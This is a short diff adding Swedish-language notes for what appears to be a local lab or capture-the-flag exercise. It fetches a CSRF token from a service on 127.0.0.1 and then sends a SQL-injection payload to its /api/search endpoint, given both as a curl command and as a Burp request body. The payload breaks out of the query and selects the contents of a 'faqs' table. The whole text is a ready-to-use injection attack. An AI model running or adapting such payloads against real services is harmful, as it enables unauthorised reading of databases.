@@ -1,0 +1,11 @@
+Hämta token från /api/token:
+TOKEN=$(curl -s http://127.0.0.1:50000/api/token | jq -r '.token') echo $TOKEN
+
+Payload för curl:
+curl -s -X POST http://127.0.0.1:50000/api/search \
+  -H "Content-Type: application/json" \
+  -H "X-CSRF-Token: $TOKEN" \
+  -d '{"query": "SELECT '"'"''"'"')))) SELECT question, answer FROM faqs /*"}'
+
+Payload för burp:
+{"query":"SELECT '')))) SELECT question, answer FROM faqs /*"}
